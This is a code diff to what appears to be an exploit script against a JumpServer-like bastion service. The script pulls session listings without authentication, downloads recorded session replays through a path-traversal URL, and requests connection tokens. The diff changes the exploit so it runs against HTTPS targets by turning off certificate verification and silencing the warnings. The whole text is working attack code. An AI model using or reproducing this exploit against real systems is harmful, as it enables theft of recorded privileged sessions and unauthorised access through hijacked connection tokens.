@@ -365,7 +365,7 @@ def dump_sessions(ctx):
     replay_type_cnt = {}
     success = False
 
-    sess_resp = requests.get(ctx.baseurl + "/api/v1/terminal/sessions/")
+    sess_resp = requests.get(ctx.baseurl + "/api/v1/terminal/sessions/", verify=False)
     if sess_resp.status_code != 200:
         logger.critical("[-] Status code: {}, Exploit failed".format(sess_resp.status_code))
         exit(1);
@@ -388,12 +388,12 @@ def dump_sessions(ctx):
             continue
 
         replay_url = "{}/{}/{}{}".format("/media/xpack/../replay", dash_time, s["id"], replay_ext)
-        # Can't direct use requests.get(), see https://mazinahmed.net/blog/testing-for-path-traversal-with-python/
         if ctx.baseurl.startswith("https"):
             c_pool = urllib3.HTTPSConnectionPool
         else:
             c_pool = urllib3.HTTPConnectionPool
-        pool = c_pool(parsed_baseurl.hostname, parsed_baseurl.port)
+        pool = c_pool(parsed_baseurl.hostname, parsed_baseurl.port, cert_reqs='CERT_NONE') # 添加 cert_reqs='CERT_NONE'
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 确保警告被禁用
         resp = pool.urlopen("GET", replay_url)
         if resp.status != 200:
             logger.error("[-] [{}] {}".format(resp.status, replay_url))
@@ -482,7 +482,7 @@ def get_token(user, asset, system_user):
     token_url = "/api/v1/authentication/connection-token/?user-only=Veraxy"
     data = {"user": user, "asset": asset, "system_user": system_user}
     token_target = base_url + token_url
-    res = requests.post(token_target, json=data)
+    res = requests.post(token_target, json=data, verify=False) # 在此行添加 verify=False
     token = res.json()["token"]
     return token
 
